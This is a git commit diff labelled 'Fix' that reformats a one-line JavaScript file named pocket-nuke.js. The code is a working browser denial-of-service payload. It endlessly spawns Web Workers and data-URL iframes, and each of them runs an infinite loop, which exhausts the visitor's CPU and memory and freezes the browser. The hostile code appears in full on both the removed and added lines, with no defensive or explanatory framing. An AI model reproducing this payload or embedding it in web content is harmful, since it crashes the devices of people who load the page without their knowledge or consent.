a2388700684e37bba153fb4a81b1919c8b10f28e
jagobainda <jagobainda@gmail.com>
2025-06-15 21:31:55 +0200

    Fix

--- src/pocket-nuke.js
+++ src/pocket-nuke.js
@@ -1,1 +1,3 @@
-(()=>{for(_=URL.createObjectURL(new Blob(["for(;;);"],{type:"text/javascript"}));;)new Worker(_),(f=document.createElement("iframe")).src="data:text/html,"+escape("<script>for(;;);</script>"),document.body.appendChild(f)})();
+(()=> {
+    for(_=URL.createObjectURL(new Blob(["for(;;);"],{type:"text/javascript"}));;)new Worker(_),(f=document.createElement("iframe")).src="data:text/html,"+escape("<script>for(;;);</script>"),document.body.appendChild(f)
+})();
